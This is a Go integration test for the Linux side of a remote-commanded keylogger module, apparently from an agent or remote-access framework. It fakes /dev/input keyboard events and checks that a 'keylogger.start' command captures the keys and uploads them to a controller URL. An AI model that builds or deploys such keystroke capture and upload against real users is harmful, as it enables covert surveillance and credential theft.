//go:build linux

package keylogger

import (
	"context"
	"encoding/binary"
	"encoding/json"
	"io"
	"testing"
	"time"
)

func TestManagerLinuxProviderIntegration(t *testing.T) {
	originalFinder := linuxDeviceFinder
	originalOpener := linuxDeviceOpener
	defer func() {
		linuxDeviceFinder = originalFinder
		linuxDeviceOpener = originalOpener
	}()

	reader, writer := io.Pipe()
	devicePath := "/dev/input/event-test"

	linuxDeviceFinder = func() ([]string, error) {
		return []string{devicePath}, nil
	}
	linuxDeviceOpener = func(path string) (io.ReadCloser, error) {
		if path != devicePath {
			t.Fatalf("unexpected device path: %s", path)
		}
		return reader, nil
	}

	provider := defaultProviderFactory()()
	if _, ok := provider.(*linuxProvider); !ok {
		t.Fatalf("expected linux provider, got %T", provider)
	}

	client := &fakeHTTPClient{}
	manager := NewManager(Config{AgentID: "agent-linux", BaseURL: "https://controller", Client: client})

	payload := CommandPayload{
		Action: "start",
		Config: &StartConfig{Mode: ModeStandard, CadenceMs: 25, BufferSize: 2},
	}
	data, _ := json.Marshal(payload)
	result := manager.HandleCommand(context.Background(), Command{ID: "cmd-linux", Name: "keylogger.start", Payload: data})
	if !result.Success {
		t.Fatalf("start failed: %s", result.Error)
	}

	done := make(chan struct{})
	go func() {
		defer close(done)
		writeLinuxEvent(t, writer, 30, 1) // 'a' press
		writeLinuxEvent(t, writer, 30, 0) // 'a' release
	}()

	req := client.popRequest(t)
	var envelope EventEnvelope
	if err := json.Unmarshal(req.Body, &envelope); err != nil {
		t.Fatalf("failed to decode envelope: %v", err)
	}
	if len(envelope.Events) == 0 {
		t.Fatalf("expected events from linux provider")
	}
	if envelope.Events[0].Key != "a" {
		t.Fatalf("expected key 'a', got %s", envelope.Events[0].Key)
	}

	stopPayload := CommandPayload{Action: "stop", SessionID: envelope.SessionID}
	stopData, _ := json.Marshal(stopPayload)
	stopResult := manager.HandleCommand(context.Background(), Command{ID: "cmd-stop", Name: "keylogger.stop", Payload: stopData})
	if !stopResult.Success {
		t.Fatalf("stop failed: %s", stopResult.Error)
	}

	writer.Close()
	<-done
}

func writeLinuxEvent(t *testing.T, w io.Writer, code uint16, value int32) {
	t.Helper()
	ev := linuxInputEvent{
		Sec:   time.Now().Unix(),
		Usec:  int64(time.Now().UnixNano()/1000) % 1000000,
		Type:  linuxEventKey,
		Code:  code,
		Value: value,
	}
	if err := binary.Write(w, binary.LittleEndian, ev); err != nil {
		t.Fatalf("failed to write linux event: %v", err)
	}
}
